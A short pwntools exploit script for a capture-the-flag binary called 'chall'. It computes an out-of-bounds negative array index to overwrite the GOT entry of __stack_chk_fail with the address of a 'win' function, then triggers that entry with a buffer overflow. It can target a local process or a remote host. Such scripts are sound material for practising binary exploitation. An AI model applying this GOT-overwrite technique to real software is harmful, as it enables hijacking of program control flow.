#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4012C5 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = -(exe.sym["array"] - exe.got["__stack_chk_fail"]) // 8

    io.sendlineafter(b":", str(offset).encode())
    io.sendlineafter(b":", f"{exe.sym["win"]}\0".encode() + b"A"*0x50)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

